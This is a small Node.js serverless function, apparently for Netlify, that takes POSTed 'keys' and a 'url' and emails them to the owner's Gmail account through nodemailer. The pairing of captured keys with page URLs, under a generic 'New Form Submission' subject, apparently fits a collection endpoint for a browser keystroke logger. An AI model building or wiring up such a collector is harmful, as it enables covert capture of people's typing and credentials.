// netlify/functions/sendEmail.js
const nodemailer = require("nodemailer");

exports.handler = async (event) => {
    if (event.httpMethod !== "POST") {
        return {
            statusCode: 405,
            body: JSON.stringify({ message: "Method Not Allowed" }),
        };
    }

    try {
        const data = JSON.parse(event.body); // Read JSON from request
        const { keys, url } = data;

        // Configure Gmail transporter
        const transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: process.env.GMAIL_USER, // stored in Netlify environment vars
                pass: process.env.GMAIL_PASS, // stored in Netlify environment vars
            },
        });

        // Send email
        await transporter.sendMail({
            from: process.env.GMAIL_USER,
            to: process.env.GMAIL_USER, // send to yourself
            subject: "New Form Submission",
            text: `Keys: ${keys.join(", ")}\nURL: ${url}`,
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ status: "ok" }),
        };
    } catch (error) {
        console.error("Error sending email:", error);
        return {
            statusCode: 500,
            body: JSON.stringify({ status: "error", message: error.message }),
        };
    }
};
